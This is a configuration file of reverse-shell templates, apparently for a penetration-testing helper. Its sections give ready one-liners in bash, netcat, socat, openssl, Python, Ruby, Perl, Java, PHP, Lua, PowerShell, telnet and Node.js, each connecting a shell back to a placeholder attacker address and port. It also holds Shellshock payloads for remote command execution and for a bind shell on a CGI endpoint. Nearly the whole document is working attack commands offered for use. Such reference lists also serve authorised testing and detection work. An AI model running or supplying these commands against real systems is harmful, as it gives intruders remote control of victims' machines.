;..######..##.....##.########.##.......##........######......####.##....##.####
;.##....##.##.....##.##.......##.......##.......##....##......##..###...##..##.
;.##.......##.....##.##.......##.......##.......##............##..####..##..##.
;..######..#########.######...##.......##........######.......##..##.##.##..##.
;.......##.##.....##.##.......##.......##.............##......##..##..####..##.
;.##....##.##.....##.##.......##.......##.......##....##.###..##..##...###..##.
;..######..##.....##.########.########.########..######..###.####.##....##.####
; Add your own shell in the following format: 
; [SHELLNAME]
; ANYVAR: YOUR_SHELL
;
; NOTICE: ESCAPE % WITH %%
; WARNING: DO NOT MODIFY THE DEFAULT SECTION !

[DEFAULT]
IPADDR:
PORT:

[bash]
shell: bash -i >& /dev/tcp/%(IPADDR)s/%(PORT)s 0>&1

[netcat]
1 shell: nc -e /bin/sh %(IPADDR)s %(PORT)s
2 shell: rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2>&1|nc %(IPADDR)s %(PORT)s >/tmp/x
3 shell: rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %(IPADDR)s %(PORT)s 1>/tmp/l

[netcat-encrypted]
1 encrypted listener (self-signed): ncat -lnvvp %(PORT)s --ssl
2 encrypted listener (custom): ncat -lnvvp %(PORT)s --ssl --ssl-key YOUR_CUSTOM_KEY --ssl-cert YOUR_CUSTOM_CERT
3 encrypted shell: ncat -v %(IPADDR)s %(PORT)s --ssl -e /bin/bash

[socat]
1 listener: socat file:`tty`,raw,echo=0 tcp-listen:%(PORT)s
2 shell: socat tcp-connect:%(IPADDR)s:%(PORT)s exec:sh,pty,stderr,setsid,sigint,sane

[socat-encrypted]
1 generate: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
2 encrypted listener: openssl s_server -quite -key key.pem -cert cert.pem -port %(PORT)s
3 encrypted shell: socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:%(IPADDR)s:%(PORT)s,key=cert.pem,verify=0


[python]
shell: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(IPADDR)s",%(PORT)s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

[ruby]
shell: ruby -rsocket -e'f=TCPSocket.open("%(IPADDR)s",%(PORT)s).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

[perl]
shell: perl -e 'use Socket;$i="%(IPADDR)s";$p=%(PORT)s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

[java]
shell: 
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%(IPADDR)s/%(PORT)s;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
    p.waitFor()

[php]
shell: php -r '$sock=fsockopen("%(IPADDR)s",%(PORT)s);exec("/bin/sh -i <&3 >&3 2>&3");'

[shellshock]
1 RCE: wget -U "() { test;};echo "Content-type: text/plain"; echo; echo; YOUR_COMMAND" http://TARGET_IP/cgi-bin/status
2 bindshell: echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p %(PORT)s -e /bin/sh\r\nHost: <TARGET_IP>\r\nConnection: close\r\n\r\n" | nc <TARGET_IP> 80

[lua]
shell: lua5.1 -e 'local host,port = "%(IPADDR)s",%(PORT)s local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

[powershell]
shell: powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("%(IPADDR)s",%(PORT)s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

[telnet]
shell: telnet %(IPADDR)s %(PORT)s | /bin/bash | telnet %(IPADDR)s 9999
Input Listener: nc -lnvvp %(PORT)s
Output Listener: nc -lnvvp 9999

[nodejs]
shell: (function(){ var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect(%(PORT)s, "%(IPADDR)s",function(){ c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c); });return /a/; })();

[openssl] ;encrypted reverse shell
1 generate: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
2 listener: openssl s_server -quite -key key.pem -cert cert.pem -port %(PORT)s
3 shell: mkfifo /tmp/z;/bin/bash -i < /tmp/z 2>&1 | openssl s_client -quiet -connect %(IPADDR)s:%(PORT)s > /tmp/z;rm /tmp/z